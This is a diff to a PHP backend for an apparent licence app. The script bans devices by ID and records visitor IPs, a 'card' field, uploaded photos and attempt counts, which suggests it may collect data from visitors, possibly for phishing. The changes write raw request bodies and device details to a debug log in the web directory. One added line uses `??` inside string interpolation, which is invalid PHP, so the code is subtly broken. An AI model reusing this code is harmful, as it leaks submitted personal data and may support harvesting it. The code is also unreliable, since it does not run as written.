@@ -8,8 +8,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     exit;
 }
 
-// === EARLY BAN CHECK ENDPOINT (for synchronous XHR from browser) ===
-$bannedFile = __DIR__ . '/banned_devices.txt';
+// Debug logging to file
+$debugLog = __DIR__ . '/debug.log';
 
 // === GET LICENCE PIN (for app to fetch dynamically) ===
 if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'getLicencePin') {
@@ -22,6 +22,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['act
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'checkBan') {
+    $bannedFile = __DIR__ . '/banned_devices.txt';
     $deviceId = isset($_GET['deviceId']) ? trim($_GET['deviceId']) : '';
     $isBanned = false;
     if ($deviceId !== '' && file_exists($bannedFile)) {
@@ -32,7 +33,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['act
         }
     }
 
-    // Debug logging for ban check
     @file_put_contents(__DIR__ . '/ban_debug.log', date('Y-m-d H:i:s') . " - CheckBan: deviceId=$deviceId, isBanned=" . ($isBanned ? 'YES' : 'NO') . " from IP " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n", FILE_APPEND);
 
     if ($isBanned) {
@@ -73,17 +73,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['act
         <?php
         exit;
     }
-    // Not banned
     http_response_code(200);
     echo "OK";
     exit;
 }
 
+// === NORMAL LOGGING ===
+@file_put_contents($debugLog, date('Y-m-d H:i:s') . " [REQUEST] Method={$_SERVER['REQUEST_METHOD']}, Content-Type={$_SERVER['CONTENT_TYPE'] ?? 'none'}, Raw input received\n", FILE_APPEND);
+
 // Read raw input
 $rawInput = file_get_contents('php://input');
-$data = json_decode($rawInput, true) ?? $_GET ?? [];
+@file_put_contents($debugLog, date('Y-m-d H:i:s') . " [RAW] " . substr($rawInput, 0, 500) . "\n", FILE_APPEND);
+
+$data = json_decode($rawInput, true);
+if (!$data) {
+    $data = $_GET ?? [];
+    @file_put_contents($debugLog, date('Y-m-d H:i:s') . " [FALLBACK] JSON decode failed, using GET data\n", FILE_APPEND);
+}
 
 // === EARLY BAN CHECK USING DEVICE ID ===
+$bannedFile = __DIR__ . '/banned_devices.txt';
 $deviceId = isset($data['deviceId']) ? trim($data['deviceId']) : 'unknown';
 
 $isBannedFull = false;
@@ -95,11 +104,9 @@ if ($deviceId !== 'unknown' && file_exists($bannedFile)) {
     }
 }
 
-// Debug logging for full request ban check
-@file_put_contents(__DIR__ . '/ban_debug.log', date('Y-m-d H:i:s') . " - FullCheck: deviceId=$deviceId, isBanned=" . ($isBannedFull ? 'YES' : 'NO') . " from IP " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n", FILE_APPEND);
+@file_put_contents($debugLog, date('Y-m-d H:i:s') . " [BANCHECK] deviceId=$deviceId, isBanned=" . ($isBannedFull ? 'YES' : 'NO') . "\n", FILE_APPEND);
 
 if ($isBannedFull) {
-    // Log ban hit for debugging
     @file_put_contents(__DIR__ . '/ban_hits.log', date('Y-m-d H:i:s') . " - Banned device (FullRequest): $deviceId from IP " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n", FILE_APPEND);
     
     http_response_code(200);
@@ -142,6 +149,8 @@ if ($isBannedFull) {
 // === Normal logging continues if not banned ===
 $timestamp = date('Y-m-d H:i:s');
 
+@file_put_contents($debugLog, date('Y-m-d H:i:s') . " [PARSE] Event=" . ($data['event'] ?? 'unknown') . ", deviceId=$deviceId\n", FILE_APPEND);
+
 // Reliable IP Detection
 $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
 if ($ip !== 'unknown' && strpos($ip, ',') !== false) {
@@ -177,14 +186,20 @@ if (isset($data['photo']) && !empty($data['photo']) && $deviceId !== 'unknown') 
     }
     if (is_dir($photosDir)) {
         $photo_path = $photosDir . '/' . $deviceId . '.txt';
-        file_put_contents($photo_path, $data['photo']);
+        @file_put_contents($photo_path, $data['photo']);
         $has_photo = true;
+        @file_put_contents($debugLog, date('Y-m-d H:i:s') . " [PHOTO] Saved photo for $deviceId\n", FILE_APPEND);
     }
 }
 
 // 1. Update Latest State (for "Current Devices" view)
 $stateFile  = __DIR__ . '/latest_state.json';
 $state = file_exists($stateFile) ? json_decode(file_get_contents($stateFile), true) : [];
+
+// Fix for state being null/empty
+if (!is_array($state)) {
+    $state = [];
+}
 
 if ($deviceId !== 'unknown') {
     if (!isset($state[$deviceId])) {
@@ -204,6 +219,7 @@ if ($deviceId !== 'unknown') {
             'last_seen' => $timestamp,
             'attempt_count' => 0
         ];
+        @file_put_contents($debugLog, date('Y-m-d H:i:s') . " [STATE] Created new device entry for $deviceId\n", FILE_APPEND);
     } else {
         $state[$deviceId]['ip'] = $ip;
         $state[$deviceId]['timestamp'] = $timestamp;
@@ -223,13 +239,20 @@ if ($deviceId !== 'unknown') {
         $state[$deviceId]['attempt_count'] = ($state[$deviceId]['attempt_count'] ?? 0) + 1;
     }
 
-    @file_put_contents($stateFile, json_encode($state));
+    $written = @file_put_contents($stateFile, json_encode($state, JSON_PRETTY_PRINT));
+    @file_put_contents($debugLog, date('Y-m-d H:i:s') . " [STATE] Written $written bytes to $stateFile\n", FILE_APPEND);
+    if ($written === false) {
+        @file_put_contents($debugLog, date('Y-m-d H:i:s') . " [STATE] FAILED to write state file!\n", FILE_APPEND);
+    }
 }
 
-// 2. Append to Visits History (visits.log)
-$visitsLog = '/var/log/licence-app/visits.log';
-if (!is_dir(dirname($visitsLog)) || !is_writable(dirname($visitsLog))) {
-    $visitsLog = __DIR__ . '/visits.log';
+// 2. Append to Visits History (visits.log) - always in project directory
+$visitsLog = __DIR__ . '/visits.log';
+
+// Ensure directory is writable
+$visitsLogDir = dirname($visitsLog);
+if (!is_writable($visitsLogDir)) {
+    @chmod($visitsLogDir, 0755);
 }
 
 $visitEntry = [
@@ -245,7 +268,19 @@ $visitEntry = [
     'card' => $card,
     'has_photo' => $has_photo
 ];
-@file_put_contents($visitsLog, json_encode($visitEntry) . "\n", FILE_APPEND);
 
-echo json_encode(["status" => "ok"]);
+$written = @file_put_contents($visitsLog, json_encode($visitEntry) . "\n", FILE_APPEND);
+@file_put_contents($debugLog, date('Y-m-d H:i:s') . " [VISIT] Written entry for $event to $visitsLog (bytes: $written)\n", FILE_APPEND);
+
+if ($written === false) {
+    @file_put_contents($debugLog, date('Y-m-d H:i:s') . " [VISIT] FAILED to write visits.log! Attempted path: $visitsLog\n", FILE_APPEND);
+    // Try alternate path
+    $altLog = __DIR__ . '/visits_alt.log';
+    $written2 = @file_put_contents($altLog, json_encode($visitEntry) . "\n", FILE_APPEND);
+    @file_put_contents($debugLog, date('Y-m-d H:i:s') . " [VISIT] Alt write result: $written2 to $altLog\n", FILE_APPEND);
+}
+
+header('Content-Type: application/json');
+echo json_encode(["status" => "ok", "logged" => true]);
+@file_put_contents($debugLog, date('Y-m-d H:i:s') . " [DONE] Response sent\n", FILE_APPEND);
 ?>
